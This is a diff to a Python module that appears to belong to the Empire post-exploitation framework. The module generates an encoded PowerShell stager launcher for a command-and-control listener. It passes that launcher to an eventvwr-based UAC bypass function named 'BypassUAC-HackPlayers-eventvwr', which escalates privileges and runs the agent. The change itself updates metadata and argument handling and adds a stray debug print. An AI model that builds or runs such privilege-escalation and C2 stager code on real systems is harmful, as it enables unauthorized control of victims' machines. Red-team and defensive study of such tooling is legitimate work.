@@ -20,7 +20,9 @@ class Module:
 
             'OpsecSafe' : False,
             
-            'MinPSVersion' : '2',
+            'Language' : 'powershell',
+
+            'MinLanguageVersion' : '2',
             
             'Comments': [
                 'https://github.com/hackplayers/psbotelegram/Functions.ps1',
@@ -98,11 +100,12 @@ class Module:
             return ""
         else:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
-
+            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+            encScript = (launcher.split(" ")[-1])
             if launcher == "":
                 print helpers.color("[!] Error in launcher generation.")
                 return ""
             else:
-                script += "BypassUAC-HackPlayers-eventvwr \"%s\"" % (launcher)
-                return script
+                script += "BypassUAC-HackPlayers-eventvwr -comando \"%s\"" % (encScript)
+                print script
+		return script
